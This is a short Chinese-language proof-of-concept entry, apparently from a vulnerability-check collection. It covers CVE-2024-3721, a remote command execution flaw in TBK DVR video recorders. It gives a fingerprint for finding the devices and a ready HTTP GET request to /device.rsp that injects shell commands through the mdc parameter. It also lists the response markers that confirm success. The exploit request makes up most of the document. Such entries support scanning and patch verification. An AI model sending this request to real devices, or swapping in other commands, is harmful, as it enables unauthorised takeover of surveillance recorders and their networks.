﻿# TBK DVR硬盘录像机-RCE-device

> 更新时间：2024-05-14

> 漏洞编号：CVE-2024-3721

> 漏洞说明： TBK DVR硬盘录像机 device接口处存在RCE(CVE-2024-3721)，恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。 

> 漏洞特征："Location: /login.rsp"

> 验证脚本：HTTP

```
GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;id;echo%20888888 HTTP/1.1
Cookie: uid=1
```

> 响应代码特征：200

> 响应内容特征：888888

> 上传文件定位：

> 验证文件来源：TBK DVR硬盘录像机-RCE-device.poc

